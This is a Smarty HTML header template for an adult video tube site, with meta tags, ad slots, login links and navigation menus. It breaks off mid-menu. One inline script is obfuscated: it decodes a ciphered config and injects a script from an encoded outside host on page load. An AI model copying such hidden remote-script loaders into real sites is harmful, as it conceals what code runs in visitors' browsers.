<!DOCTYPE html>{insert name=languagelang assign=lang}
<html lang="{$lang}">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <meta name="robots" content="{if $menu == 'go' || $menu == 'static'}noindex, nofollow{else}index, follow{/if}" />
    <meta name="description" content="{if isset($self_description) && $self_description != ''}{if $menujs == 'video_js'}{section name=i loop=$categories}{t c='global.watch_free'} {$categories[i].name|escape:'html'}{t c='global.videos'} ({$categories[i].name|escape:'html'}) {/section}{/if}{$self_description|escape:'html'}{else}{$meta_description}{/if}" />
    <title>{if isset($self_title) && $self_title != ''}{$self_title|escape:'html'}{else}{$site_name}{/if}</title>
    {*<meta name="keywords" content="{if isset($self_keywords) && $self_keywords != ''}{$self_keywords|escape:'html'}{else}{$meta_keywords}{/if}" />*}
    <link rel="canonical" href="https://5xsq.com{$current_url}" />
    <link href="https://5xsq.com{$current_url}" rel="canonical" />
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="x-default">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="en-ru">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="en-IN">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="hi">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="bn">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="mr">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="te">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="ta">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="gu">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="kn">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="or">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="ml">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="ja">
    <link rel="alternate" href="https://5xsq.com{$current_url}" hreflang="th">
    <meta property="og:locale" content="{$lang}" />
    <meta property="og:title" content="{if isset($self_title) && $self_title != ''}{$self_title|escape:'html'}{else}{$site_name}{/if}" />{if $view}
	{assign var='vtags' value=$video.keyword}

    <meta property="og:description" content="{if isset($self_description) && $self_description != ''}{$self_description|escape:'html'}{else}{$meta_description}{/if}" />
    <meta property="og:video:url" content="{$m3key}">
    <meta property="og:video:type" content="text/html">
    <meta property="og:url" content="{$baseurl}/video/{$video.VID}/{$video.title|md5}" />
    <meta property="og:type" content="article" />
    <meta property="og:image" content="{insert name=thumb_path vid=$video.VID}/{if $video.embed_code != ''}1{else}default{/if}.jpg" />
    <meta property="og:site_name" content="{$site_name}" />
	<meta property="article:published_time" content="{$iso8601_time = date('c', $video.addtime)}{$iso8601_time}" />
	<meta property="article:modified_time" content="{$time = time()}{$iso8601_time = date('c', $time)}{$iso8601_time}" />
	<meta property="og:image:width" content="616" />
	<meta property="og:image:height" content="347" />
	{section name=i loop=$vtags}
    <meta property="video:tag" content="{$vtags[i]}" />
	{/section}
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:description" content="{if isset($self_description) && $self_description != ''}{$self_description|escape:'html'}{else}{$meta_description}{/if}" />
    <meta name="twitter:title" content="{if isset($self_title) && $self_title != ''}{$self_title|escape:'html'}{else}{$site_name}{/if}" />
	{else}
	
    <meta property="og:url" content="https://5xsq.com{$current_url}" />
	<meta property="og:type" content="website" />
	<meta property="og:title" content="{if isset($self_title) && $self_title != ''}{$self_title|escape:'html'}{else}{$site_name}{/if}" />
	<meta property="og:description" content="{if isset($self_description) && $self_description != ''}{$self_description|escape:'html'}{else}{$meta_description}{/if}" />
	<meta property="og:site_name" content="{$site_name}" />
	<meta property="article:modified_time" content="{$time = time()}{$iso8601_time = date('c', $time)}{$iso8601_time}" />
	<meta property="og:image" content="{$relative}/images/favicons/apple-icon-152x152.png" />
	<meta property="og:image:width" content="293" />
	<meta property="og:image:height" content="90" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Est. reading time">
	<meta name="twitter:data1" content="16 分钟">
	{/if}
    <script type="text/javascript">
	var base_url = window.location.protocol + "//" + window.location.hostname;
      var imgs_url = "{$imgsurl}";
      var max_thumb_folders = "{$max_thumb_folders}";
      {*var tpl_url = "{$relative_tpl}"; *}
	  {if isset($video.VID)}
      var video_id = "{$video.VID}";
	   {/if}
      var lang_deleting = "{t c='global.deleting'}";
      var lang_flaging = "{t c='global.flaging'}";
      var lang_loading = "{t c='global.loading'}";
      var lang_sending = "{t c='global.sending'}";
      var lang_share_name_empty = "{t c='share.name_empty'}";
      var lang_share_rec_empty = "{t c='share.recipient'}";
      var fb_signin = "{$fb_signin}";
      var fb_appid = "{$fb_appid}";
      var g_signin = "{$g_signin}";
      var g_cid = "{$g_cid}";
      var signup_section = false;
      var relative = "{$relative}";
      var search_v = "{t c='ajax.search'} {t c='global.videos'}";
      var search_a = "{t c='ajax.search'} {t c='global.albums'}";
      var search_u = "{t c='ajax.search'} {t c='global.users'}";
      var lang_global_delete = "{t c='global.delete'}";
      var lang_global_yes = "{t c='global.yes'}";
      var lang_global_no = "{t c='global.no'}";
      var lang_global_remove = "{t c='global.remove'}"; 
	  {if isset($smarty.session.uid)}
      var session_uid = "{$smarty.session.uid}"; 
	  {else}
      var session_uid = ""; 
	  {/if}
      var current_url = "https://5xsq.com{$current_url}";
      var alert_messages = {$messages|json_encode};
      var alert_errors = {$errors|json_encode};
      </script>
    {if $menujs == 'home' || $menujs == 'video_js' || $menujs == 'search_js' || $menujs == 'user'}
    {*<script src="{$assets_url}/5x/assets/js/jquery-3.1.0.min.js" crossorigin="anonymous"></script>
    <script src="https://cdn.staticfile.org/jquery/3.1.0/jquery.min.js" crossorigin="anonymous"></script>*}
    <script src="{$assets_url}/5x/assets/js/jquery-3.1.0.min.js" crossorigin="anonymous"></script>{/if}
    <link rel="preload" href="{$assets_url}/5x/por/css/style.css?v=c179b155512113" as="style">{*
    <link rel="preload" as="image" href="/68000/68633/276x155/6.jpg" imagesrcset="/68000/68633/276x155/6.jpg 276w, /68000/68633/482x271/6.jpg 482w" imagesizes="274px">*}
    <link href="{$assets_url}/5x/por/css/style.css?v=c179b155512113" rel="stylesheet">
   
    <link rel="apple-touch-icon" sizes="180x180" href="{$baseurl}/images/favicons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="{$baseurl}/images/favicons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="{$baseurl}/images/favicons/favicon-16x16.png">
    <link rel="manifest" href="/images/favicons/site.webmanifest">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-config" content="/images/favicons/browserconfig.xml">
    <meta name="theme-color" content="#ffffff">
    <link href="{$relative}/rss/" rel="alternate" type="application/rss+xml" />
	<meta name="juicyads-site-verification" content="b47ac68e6fec5c22413516fee0888cb7">
	<meta name="ero_verify" content="5f37eeb17ce8be17ad81371a76ea314f" />
 {*<script src="{$assets_url}/5x/por/js/bootstrap.min.js"></script>*}
 {*{literal}
 <script type="text/javascript">
 ((document)=>{'use strict';let fastNode;let failed;let isRunning;const DEST_LIST=['jscss.5xapp.com','testingcf.jsdelivr.net','fastly.jsdelivr.net','cdn.jsdelivr.net','gcore.jsdelivr.net'];const PREFIX='//';const SOURCE=DEST_LIST[0];const starTime=Date.now();const TIMEOUT=1000;const STORE_KEY='jscss';const TEST_PATH='/gh/5xsq/jscss@main/empty.css?';const shouldReplace=(text)=>text&&text.includes(PREFIX+SOURCE);const replace=(text)=>text.replace(PREFIX+SOURCE,PREFIX+fastNode);const setTimeout=window.setTimeout;const $=document.querySelectorAll.bind(document);const replaceElementSrc=()=>{let element;let value;for(element of $('link[rel="stylesheet"]')){value=element.href;if(shouldReplace(value)&&!value.includes(TEST_PATH)){element.href=replace(value)}}for(element of $('script')){value=element.src;if(shouldReplace(value)){const newNode=document.createElement('script');newNode.src=replace(value);element.defer=true;element.src='';element.before(newNode);element.remove()}}for(element of $('img')){value=element.src;if(shouldReplace(value)){element.src='';element.src=replace(value)}}for(element of $('*[style]')){value=element.getAttribute('style');if(shouldReplace(value)){element.setAttribute('style',replace(value))}}for(element of $('style')){value=element.innerHTML;if(shouldReplace(value)){element.innerHTML=replace(value)}}};const tryReplace=()=>{if(!isRunning&&failed&&fastNode){console.warn(SOURCE+' is not available. Use '+fastNode);isRunning=true;setTimeout(replaceElementSrc,0);setTimeout(replaceElementSrc,20);setInterval(replaceElementSrc,500)}};const checkAvailable=(url,callback)=>{let timeoutId;const newNode=document.createElement('link');const handleResult=(isSuccess)=>{if(!timeoutId){return}clearTimeout(timeoutId);timeoutId=0;if(!isSuccess)newNode.href='data:text/css;base64,';newNode.remove();callback(isSuccess)};timeoutId=setTimeout(handleResult,TIMEOUT);newNode.addEventListener('error',()=>handleResult(false));newNode.addEventListener('load',()=>handleResult(true));newNode.rel='stylesheet';newNode.text='text/css';newNode.href=url+TEST_PATH+starTime;document.head.insertAdjacentElement('afterbegin',newNode)};const cached=(()=>{try{return Object.assign({},JSON.parse(localStorage.getItem(STORE_KEY)||'{}'))}catch{return{}}})();const main=()=>{cached.time=starTime;cached.failed=false;cached.fastNode=null;for(const url of DEST_LIST){checkAvailable('https://'+url,(isAvailable)=>{if(!isAvailable&&url===SOURCE){failed=true;cached.failed=true}if(isAvailable&&!fastNode){fastNode=url}if(isAvailable&&!cached.fastNode){cached.fastNode=url}tryReplace()})}setTimeout(()=>{if(failed&&!fastNode){fastNode=DEST_LIST[1];tryReplace()}localStorage.setItem(STORE_KEY,JSON.stringify(cached))},TIMEOUT+100)};if(cached.time&&starTime-cached.time<60*60*1000&&cached.failed&&cached.fastNode){failed=true;fastNode=cached.fastNode;tryReplace();setTimeout(main,1000)}else if(document.head){main()}else{const observer=new MutationObserver(()=>{if(document.head){observer.disconnect();main()}});const observerOptions={childList:true,subtree:true};observer.observe(document,observerOptions)}})(document);
	</script>
      {/literal}*}
      {literal}
 <style type="text/css"> @media (max-width: 960px){.site-wrapper.mobile {padding-top: 0px;}}.row {display: -ms-flexbox;display: flex;-ms-flex-wrap: wrap;flex-wrap: wrap;margin-right: -15px;margin-left: -15px;}.col-12 {-ms-flex: 0 0 100%;flex: 0 0 100%;max-width: 100%;}.col-12 {position: relative;width: 100%;min-height: 1px;padding-right: 15px;padding-left: 15px;}.well-filters {-webkit-border-radius: 0;-moz-border-radius: 0;border-radius: 0;-moz-box-shadow: inset 0 -2px 0 #e5e5e5;-webkit-box-shadow: inset 0 -2px 0 #e5e5e5;box-shadow: inset 0 -2px 0 #e5e5e5;padding: 0!important;border: none;background-color: transparent!important;}.card {color: #606060;background-color: #fff;border: 1px solid #e5e5e5;margin-bottom: 10px;}.card {position: relative;display: -ms-flexbox;display: flex;-ms-flex-direction: column;flex-direction: column;min-width: 0;word-wrap: break-word;background-color: #fff;background-clip: border-box;border: 1px solid rgba(0,0,0,.125);border-radius: .25rem;}.card-body {-ms-flex: 1 1 auto;flex: 1 1 auto;padding: 1.25rem;}.card-title {margin-bottom: .75rem;}.card a {color: #0d0d0d;}p {margin-top: 0;margin-bottom: 1rem;}.card-sub {color: #8d8d8d;border-top: 1px solid #e5e5e5;padding-top: 10px;}.float-left {float: left!important;}.float-right {float: right!important;}.card-body {-ms-flex: 1 1 auto;flex: 1 1 auto;padding: 1.25rem;}.card-body img, .card-body iframe {max-width: 100%;}.small-avatar {width: 30px;height: auto;-webkit-border-radius: 3px;-moz-border-radius: 3px;border-radius: 3px;margin-right: 10px;}img {vertical-align: middle;border-style: none;}.mb-3, .my-3 {margin-bottom: 1rem!important;}.mt-3, .my-3 {margin-top: 1rem!important;}@media (min-width: 576px) .container {max-width: 540px;}.container {}@media (max-width: 960px) .site-wrapper>* {margin-right: 0;min-width: 320px;-webkit-transition: margin .2s;-o-transition: margin .2s;-moz-transition: margin .2s;transition: margin .2s;}@media (max-width: 960px) .container {padding: 0 5px;}.content-left {position: relative;border-radius: 8px;overflow: hidden;}.ui-menu .ui-menu-item-ss:hover {color: #fff;background: #f05;}.ui-menu .ui-menu-item-ss {position: relative;margin: 0;padding: 10px 10px 10px 20px;cursor: pointer;min-height: 0;font-size: 15px;line-height: 16px;color: #868686;font-weight: 700;}.ui-menu .ui-menu-item-ss .total-videos {color: #bcbcbc;font-size: 11px;font-style: italic;margin: 0 0 0 5px;}.ad-index {display: flex;justify-content: center;align-items: center;flex-direction: column;text-align: center;width: 98%;margin-left: 1%;padding-top: 2px;}.ad-indexmo {display: flex;justify-content: center;align-items: center;flex-direction: column;text-align: center;width: 98%;margin-left: 1%;padding-top: 2px;}.ad-content {display: flex;justify-content: center;align-items: center;flex-direction: column;text-align: center;width: 98%;margin-left: 1%;padding-top: 2px;}.ad-index_dx {display: flex;justify-content: center;align-items: center;flex-direction: column;text-align: center;width: 98%;margin-left: 1%;padding-top: 2px;}@media screen and (max-width: 1026px) {.ad-indexmo {padding-top: 43px;}}@media screen and (max-width: 630px) {.ad-indexmo {padding-top: 63px;}}@media screen and (max-width: 411px) {.ad-index_dx {}}@media screen and (max-width: 410px) {.ad-index_dx {}.ad-indexmo {padding-top: 63px;}}@media screen and (max-width: 376px) {.ad-indexmo {padding-top: 67px;}}@media screen and (max-width: 389px) {.ad-index_dx {}.ad-indexmo {padding-top: 65px;}}@media screen and (max-width: 320px) {.ad-indexmo {padding-top: 86px;}}</style>
  {/literal} 
  </head>
 <script src="/templates/frontend/dark-5xsq/js/body.js"></script>
  <body class="no-touch">
    <div class="mobile_top">
    {if $db_hf}
      <!---ADV--->
      <div class="ad-index">{literal}
        <style>.ad-index a img {width: 960px;}.ad-indexmo a img {width: 960px;}</style>{/literal} {section name=i loop=$db_hf} {$db_hf[i].adv_text} {/section}</div>
      <!---ADV--->{/if}</div>
    <div class="site-wrapper ">
      <div class="pc_top">
        <div class="wrap-nav-top">
          <div class="container">
            <ul class="registration-links">
            <li class="langs-selector">
            {if $multi_language}
                  {insert name=languagename assign=name}{insert name=languagename assign=name}{insert name=languagelang assign=lang}
									<div class="current-lang" data-toggle="dropdown" aria-expanded="false">
																					<img class="img-flag" src="/5x/por/img/flags_png/{$lang}.svg" width="20" height="15" alt="">
											<span class="text">{$name}</span>
																				<i class="icon-arrow-down"></i>
									</div> {/if}
									<ul class="menu-drop" id="langs-drop">
                  {foreach from=$languages key=key item=language }
																					<li class="item-menu">
												<a class="item-link js-redirect-lang change-language" href="#" id="{$key}">
													<img class="img-flag" src="/5x/por/img/flags_png/{$language.lang}.svg" width="20" height="15" alt="">
													{$language.name}
												</a>
											</li>
                    {/foreach}<form name="languageSelect" id="languageSelect" method="post" action="">
			<input name="language" id="language" type="hidden" value="" />
			</form>
																													</ul>
								</li>
            {if isset($smarty.session.uid)}                         
            <li class="item-holder user"> <span class="item" data-toggle="dropdown"> <span class="wrap-user-img"><img src="{$assets_url}/5x/por/img/no-avatar-user.png" alt=""></span> <span class="name"><span>{$smarty.session.username|truncate:15:"..."}</span></span> </span>
             <ul class="dropdown-user-links">
             <li> <a class="link{if $menu_if == 'user'} active{/if}" href="{$relative}/user">{t c='user.wall'}{*<span class="number">8</span>*} </a> </li>
             <li><a class="link{if $menu_if == 'playlist'} active{/if}" href="{$relative}/user/{$smarty.session.username}/playlist">{t c='user.recently_watched'}</a> </li>  
             <li><a class="link{if $menu_if == 'favorite'} active{/if}" href="{$relative}/user/{$smarty.session.username}/favorite/videos">{t c='user.FAVORITE_VIDEOS'}</a> </li> 
                         
               {if $video_module == '1'}<li> <a class="link{if $menu_if == 'videos'} active{/if}" href="{$relative}/user/{$smarty.session.username}/videos">{t c='topnav.my_videos'}</a> </li>{/if}
               {if $photo_module == '1'}<li> <a class="link{if $menu_if == 'albums'} active{/if}" href="{$relative}/user/{$smarty.session.username}/albums">{t c='topnav.my_photos'}</a> </li>{/if}
               <li><a class="link{if $menu_if == 'edit'} active{/if}" href="{$relative}/user/edit">{t c='user.edit_profile'}</a> </li>  
                <li><a class="link{if $menu_if == 'feeds'} active{/if}" href="{$relative}/feeds">{translate c='global.my_feeds'}</a> </li>
               {*<a class="link" href="{$relative}/requests"> {translate c='global.requests'} {if $requests_count > 0}<span class="number">{$requests_count}</span>{/if}</a>*}
               {*<a class="link" href="{$relative}/user/{$smarty.session.username}/blog">{t c='topnav.my_blog'}</a>*}
               {*<a class="link" href="{$relative}/mail/inbox"> {translate c='global.inbox'} {if $mails_count > 0}<span class="number">{$mails_count}</span>{/if}</a>*}
               <li> <a class="link" href="{$relative}/logout">{translate c='global.sign_out'}</a> </li>
              </ul>
            </li>
            {else}
              <li class="item-holder">
                <a href="#" class="item btn-popup js__login" data-block="logon_login">
                  <i class="icon-fa-login"></i>
                  <span>{translate c='global.login'}</span>
                </a>
              </li>
              <li class="item-holder active">
                <a href="#" class="item btn-popup" data-block="signup_signup">
                  <i class="icon-fa-signup">
                  </i>
                  <span>{translate c='global.sign_up'}</span>
                </a>
              </li>
            {/if}
            </ul>
            <div class="nav-top-button">
              <span class="sendwich nav-top-sendwich">
                <span></span>
              </span>
              <span>Our Network</span>
            </div>
            <div class="nav-top">
              <ul>
                <li>
                  <a href="{$relative}/static/advertise" target="_blank" title="商务合作">商务合作</a>
                </li>{*
                <li>
                  <a href="#" target="_blank" title="HDtube Porn">HDtube Porn</a>
                </li>
                <li>
                  <a href="#" target="_blank" title="ZBPorn.com">ZBPorn.com</a>
                </li>
                <li>
                  <a href="#" target="_blank" title="Rat XXX">Rat XXX</a>
                </li>*}</ul>
            </div>
          </div>
        </div>{if $db_hf}
        <!---ADV--->
        <div class="ad-index">{literal}
          <style>.ad-index a img {width: 960px;}.ad-indexmo a img {width: 960px;}</style>{/literal} {section name=i loop=$db_hf} {$db_hf[i].adv_text} {/section}</div>
        <!---ADV--->{/if}
        <header class="header" id="header">
          <div class="container clearfix">
            <div class="navbar-header">
              <div class="logo">
                <a href="{$relative}/" title="Free Porn Tube">
                  <img src="/images/logo/logo.svg" alt="Free Porn Tube" width="200" height="41" style="height: auto;"></a>
              </div>
              <div class="menu-btn sendwich" id="aamenu-btn">
                <span>
                </span>
              </div>
              <div class="search-btn sendwich" id="aasearch-btn">
                <span>
                </span>
              </div>
            </div>
            <div class="navbar-collapse clearfix">
              <div class="responsive-menu">
                <nav class='nav'>
                  <ul>
                    <li{if $menu=='home' } class="active" {/if}>
                      <a href="{$relative}/" title="{translate c='menu.home'}">
                        <i class="icon-fa-home">
                        </i>
                        <span>{translate c='menu.home'}</span>
                      </a>
                      </li>
                      <li{if $menu=='videos' } class="active" {/if}>
                        <a href="{$relative}/videos" title="{translate c='menu.videos'}">
                          <i class="icon-fa-cats">
                          </i>
                          <span>{translate c='menu.videos'}</span>
                        </a>
                        </li>
                        <li {if $menu=='recommendation' } class="active" {/if}>
                          <a href="{$relative}/recommendation" title="{translate c='menu.featured_videos'}">
                            <i class="icon-fa-models">
                            </i>
                            <span>{translate c='menu.featured_videos'}</span>
                          </a>
                        </li>
                        <li {if $menu=='uncensored' } class="active" {/if}>
                          <a href="{$relative}/uncensored" title="{translate c='index.most_wm_videos'}">
                            <i class="icon-fa-channels">
                            </i>
                            <span>{translate c='index.most_wm_videos'}</span>
                          </a>
                        </li>
                        <li {if $menu=='censored' } class="active" {/if}>
                          <a href="{$relative}/censored" title="{translate c='index.most_ym_videos'}">
                            <i class="icon-fa-channels">
                            </i>
                            <span>{translate c='index.most_ym_videos'}</span>
                          </a>
                        </li>
                        <li{if $menu=='albums' } class="active" {/if}>
                          <a href="{$relative}/albums" title="{translate c='menu.photos'}">
                            <i class="icon-fa-channels">
                            </i>
                            <span>{translate c='menu.photos'}</span>
                          </a>
                          </li>
                          <li{if $menu=='blogs' } class="active" {/if}>
                            <a href="{$relative}/blogs" title="{translate c='menu.blogs'}">
                              <i class="icon-fa-channels">
                              </i>
                              <span>{translate c='menu.blogs'}</span>
                            </a>
                            </li>
                            <li{if $menu=='categories' } class="active" {/if}>
                              <a href="{$relative}/categories" title="{translate c='menu.categories'}">
                                <i class="icon-fa-channels">
                                </i>
                                <span>{translate c='menu.categories'}</span>
                              </a>
                              </li>
                              <li{if $menu=='community' } class="active" {/if}>
                                <ahref="{$relative}/community" title="Community">
                                  <i class="icon-fa-community"></i>
                                  <span>{translate c='menu.community'}</span>
                                </a>
                                </li>
                                <li>
                                  <a href="https://www.5xp168.com" target="_blank" rel="nofollow" title="{t c ='global.website_release'}">
                                    <i class="icon-model"></i>
                                    <span>{t c ='global.website_release'}</span>
                                  </a>
                                </li>
                                <li>
                                  <a href="{$uploadurl}" target="_blank" rel="nofollow" title="{translate c='menu.upload'}">
                                    <i class="icon-model">
                                    </i>
                                    <span>{translate c='menu.upload'}</span>
                                  </a>
                                </li>
                  </ul>
                  <ul class="nav-categories">{***修改位置:\include\config.php***} {$suggestion_dh}</ul>
                </nav>
              </div>
            </div>
          </div>
        </header>
{literal}
<script type="text/javascript">
 var p$00a = 'p$00a' + (new Date().getTime()) + 'zz'; window[p$00a] = {a:'abcdefghijklmnopqrstuvwxyz0123456789cwxmbnrjz2dsi8yagev759k03plu1hfqt64o', b:'{"AZIb":"f6ot44", "BVIb":"61fluh", "CXrr1":"5a", "DLtag":"u", "Emjk5":"", "XCge1s":"xccjkg.xyi" , "Zt1":"ayaxcvj.8b7", "ZZ1":"ecaysyd.xyi" }', c:'{"Abkr221":"vxeza7", "Bo9ssm":"//xm8.xccjkg.xyi/caa.2v"}', d:'{"Ag4":"wym3", "Bx1":"caab8mCjzsm", "Cky":"vex", "Dmg":"xebc7bEsbib87"}'};
var _0x5d4b=['235913QVfbwv','slice','length','162209QBmAmV','14238hyOOTq','323207DTbifh','split','1DqiKtq','135866HTbavB','indexOf','call','27654SKXHbY','parse','undefined','32Ijckmz','keys','map','ceil','115980hcFVDy','values','join'];var _0x208c=function(_0x31a8d7,_0x5f36b3){_0x31a8d7=_0x31a8d7-0x167;var _0x5d4be1=_0x5d4b[_0x31a8d7];return _0x5d4be1;};(function(_0x276f94,_0x57c4ff){var _0x50057c=_0x208c;while(!![]){try{var _0x40d184=parseInt(_0x50057c(0x168))+parseInt(_0x50057c(0x16f))*parseInt(_0x50057c(0x179))+-parseInt(_0x50057c(0x176))+parseInt(_0x50057c(0x173))+parseInt(_0x50057c(0x16e))+-parseInt(_0x50057c(0x170))+parseInt(_0x50057c(0x16b))*-parseInt(_0x50057c(0x172));if(_0x40d184===_0x57c4ff)break;else _0x276f94['push'](_0x276f94['shift']());}catch(_0x411836){_0x276f94['push'](_0x276f94['shift']());}}}(_0x5d4b,0x45111),function(){var _0x1ba274=function(_0x2f3a9a){var _0x3f0bc4=_0x208c,_0x1894ba=Math[_0x3f0bc4(0x167)](this['a'][_0x3f0bc4(0x16d)]/0x2),_0x539548=this['a'][_0x3f0bc4(0x16c)](0x0,_0x1894ba),_0x5d8009=this['a'][_0x3f0bc4(0x16c)](_0x1894ba);decrypt=this[_0x2f3a9a][_0x3f0bc4(0x171)]('')[_0x3f0bc4(0x17b)](_0x28f433=>{var _0xd7612d=_0x3f0bc4;return _0x5d8009['split']('')['includes'](_0x28f433)?_0x539548[_0x5d8009[_0xd7612d(0x174)](_0x28f433)]:_0x28f433;})[_0x3f0bc4(0x16a)]('');try{return JSON[_0x3f0bc4(0x177)](decrypt);}catch{return decrypt;}},_0x57bb85=window[p$00a],_0x219d97=function(_0x28efac,_0x22a031){var _0x5bee8e=_0x208c,_0x3963a0=Object[_0x5bee8e(0x169)](_0x1ba274[_0x5bee8e(0x175)](_0x57bb85,Object[_0x5bee8e(0x17a)](_0x57bb85)[_0x28efac]));return typeof _0x22a031!=_0x5bee8e(0x178)?_0x3963a0[_0x22a031]:_0x3963a0;};window[p$00a]['x']=function(){return _0x219d97(0x1);};var _0xf1db57=document[_0x219d97(0x3,0x3)](_0x219d97(0x2,0x0));_0xf1db57[_0x219d97(0x3,0x2)]=_0x219d97(0x2,0x1),document[_0x219d97(0x3,0x0)][_0x219d97(0x3,0x1)](_0xf1db57),p$00a=undefined;}());
 
 </script>
{/literal}
        <div class="wrap-search bg-darker">
          <div class="container">
            <div class="search" itemscope itemtype="http://schema.org/WebSite">
              <meta itemprop="url" content="{$relative}/" />
              <form itemprop="potentialAction" itemscope itemtype="https://schema.org/SearchAction" class="js-search-form form1" id="search_form_xs" action="{$relative}/search/{if !isset($search_type)}videos{else}{$search_type}{/if}" data-url="{$relative}/search/%QUERY%/" name="search" id="search_form" method="post">
                <meta itemprop="target" content="{$relative}/search/{literal}{q}{/literal}/" />
                <input class="autocomplete-input" itemprop="query-input" type="search" name="search_query" value="{if isset($search_query)}{$search_query_f}{/if}" id="search_key" placeholder="{t c='ajax.search'} {if isset($search_type) && $search_type == 'photos'} {t c='global.albums'}{elseif isset($search_type) && $search_type == 'users'} {t c='global.users'}{else}{t c='global.videos'}{/if}" name="search_query" id="search_query_xs" value="{if isset($search_query)}{$search_query_f}{/if}">
                <button type="submit">
                  <span>
                    <i class="icon-search">
                    </i>
                  </span>
                </button>
              </form>
            </div>
          </div>
        </div>
      </div>
      <div class="mobile_top">
        <div class="mobile-header">
          <div class="wrap-nav-top">
            <div class="container">
              <ul class="registration-links">
            {if isset($smarty.session.uid)}                         
            <li class="item-holder user"> <span class="item" data-toggle="dropdown"> <span class="wrap-user-img"><img src="{$assets_url}/5x/por/img/no-avatar-user.png" alt=""></span> <span class="name"><span>{$smarty.session.username|truncate:15:"..."}</span></span> </span>
             <ul class="dropdown-user-links">
             <li> <a class="link{if $menu_if == 'user'} active{/if}" href="{$relative}/user">{t c='user.wall'}{*<span class="number">8</span>*} </a> </li>
             <li><a class="link{if $menu_if == 'playlist'} active{/if}" href="{$relative}/user/{$smarty.session.username}/playlist">{t c='user.recently_watched'}</a> </li>  
             <li><a class="link{if $menu_if == 'favorite'} active{/if}" href="{$relative}/user/{$smarty.session.username}/favorite/videos">{t c='user.FAVORITE_VIDEOS'}</a> </li> 
                         
               {if $video_module == '1'}<li> <a class="link{if $menu_if == 'videos'} active{/if}" href="{$relative}/user/{$smarty.session.username}/videos">{t c='topnav.my_videos'}</a> </li>{/if}
               {if $photo_module == '1'}<li> <a class="link{if $menu_if == 'albums'} active{/if}" href="{$relative}/user/{$smarty.session.username}/albums">{t c='topnav.my_photos'}</a> </li>{/if}
               <li><a class="link{if $menu_if == 'edit'} active{/if}" href="{$relative}/user/edit">{t c='user.edit_profile'}</a> </li>  
                <li><a class="link{if $menu_if == 'feeds'} active{/if}" href="{$relative}/feeds">{translate c='global.my_feeds'}</a> </li>
               {*<a class="link" href="{$relative}/requests"> {translate c='global.requests'} {if $requests_count > 0}<span class="number">{$requests_count}</span>{/if}</a>*}
               {*<a class="link" href="{$relative}/user/{$smarty.session.username}/blog">{t c='topnav.my_blog'}</a>*}
               {*<a class="link" href="{$relative}/mail/inbox"> {translate c='global.inbox'} {if $mails_count > 0}<span class="number">{$mails_count}</span>{/if}</a>*}
               <li> <a class="link" href="{$relative}/logout">{translate c='global.sign_out'}</a> </li>
              </ul>
            </li>
            {else}
              <li class="item-holder">
                <a href="#" class="item btn-popup js__login" data-block="logon_login">
                  <i class="icon-fa-login"></i>
                  <span>{translate c='global.login'}</span>
                </a>
              </li>
              <li class="item-holder active">
                <a href="#" class="item btn-popup" data-block="signup_signup">
                  <i class="icon-fa-signup">
                  </i>
                  <span>{translate c='global.sign_up'}</span>
                </a>
              </li>
            {/if}
              </ul>
              </div>
          </div>
          <header class="header" id="header">
            <div class="container clearfix">
              <div class="navbar-header">
                <div class="logo">
                  <a href="{$relative}/" title="Free Porn Tube">
                    <img src="/images/logo/logo.svg" alt="Free Porn Tube" width="145" height="30" style="height: auto;">
                  </a>
                </div>
                <div class="menu-btn sendwich" id="menu-btn">
                  <span>
                  </span>
                </div>
                <div class="search-btn sendwich" id="search-btn">
                  <span>
                  </span>
                </div>
              </div>
              <div class="navbar-collapse clearfix">
                <div class="responsive-menu">
                  <nav class="nav">
                    <ul>
                      <li{if $menu=='home' } class="active" {/if}>
                        <a href="{$relative}/" title="{translate c='menu.home'}">
                          <i class="icon-fa-home">
                          </i>
                          <span>{translate c='menu.home'}</span>
                        </a>
                        </li>
                        <li{if $menu=='videos' } class="active" {/if}>
                          <a href="{$relative}/videos" title="{translate c='menu.videos'}">
                            <i class="icon-video">
                            </i>
                            <span>{translate c='menu.videos'}</span>
                          </a>
                          </li>
                          <li{if $menu=='recommendation' } class="active" {/if}>
                            <a href="{$relative}/recommendation" title="{translate c='menu.featured_videos'}">
                              <i class="icon-fa-models">
                              </i>
                              <span>{translate c='menu.featured_videos'}</span>
                            </a>
                            </li>
                            <li{if $menu=='uncensored' } class="active" {/if}>
                              <a href="{$relative}/uncensored" title="{translate c='index.most_wm_videos'}">
                                <i class="icon-fa-heart">
                                </i>
                                <span>{translate c='index.most_wm_videos'}</span>
                              </a></li>
                              <li{if $menu=='censored' } class="active" {/if}>
                                <a href="{$relative}/censored" title="{translate c='index.most_ym_videos'}">
                                  <i class="icon-fa-star">
                                  </i>
                                  <span>{translate c='index.most_ym_videos'}</span>
                                </a>
                                </li>
                                <li{if $menu=='albums' } class="active" {/if}>
                                  <a href="{$relative}/albums" title="{translate c='menu.photos'}">
                                    <i class="icon-fa-cats">
                                    </i>
                                    <span>{translate c='menu.photos'}</span>
                                  </a>
                                  </li>
                                  <li{if $menu=='blogs' } class="active" {/if}>
                                    <a href="{$relative}/blogs" title="{translate c='menu.blogs'}">
                                      <i class="icon-edit">
                                      </i>
                                      <span>{translate c='menu.blogs'}</span>
                                    </a>
                                    </li>
                                    <li{if $menu=='categories' } class="active" {/if}>
                                      <a href="{$relative}/categories" title="{translate c='menu.categories'}">
